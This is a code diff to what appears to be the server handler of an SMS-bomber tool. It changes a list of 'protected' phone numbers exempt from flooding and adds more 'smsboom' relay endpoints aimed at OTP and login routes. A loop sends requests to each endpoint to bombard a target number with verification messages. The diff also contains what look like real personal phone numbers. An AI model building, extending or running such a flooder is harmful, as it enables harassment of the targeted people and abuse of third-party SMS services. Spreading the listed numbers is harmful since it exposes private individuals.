@@ -11,10 +11,9 @@ export default async function handler(req,res){
  /* ---------------- PROTECTED NUMBERS ---------------- */
 
  const PROTECTED = [
-  "01760000000",
   "01760432796",
-  "01900000000",
-  "01760000000"
+  "01995869970",
+  "01762633635"
  ];
 
  if(PROTECTED.includes(number)){
@@ -43,12 +42,14 @@ export default async function handler(req,res){
  /* ---------------- API HIT ---------------- */
 
  const APIS=[
-    "https://smsboomc.vercel.app/shikho-send-otp",
+  "https://smsboom.vercel.app/send-otp",
     "https://smsbooma.vercel.app/verify-phone",
-    "https://smsboom.vercel.app/send-otp",
-    "https://smsboomv.vercel.app/otp",
-    "https://smsboomv.vercel.app/otp",
-    "https://smsboomv.vercel.app/otp"
+    "https://smsboomc.vercel.app/shikho-send-otp",
+    "https://smsboomg.vercel.app/bondi-login",
+    "https://smsboomi.vercel.app/bioscope-login",
+    "https://smsboomj.vercel.app/send-otp",
+    "https://smsboomk.vercel.app/send-otp",
+    "https://smsboomm.vercel.app/send-otp"
  ];
 
  for(const api of APIS){
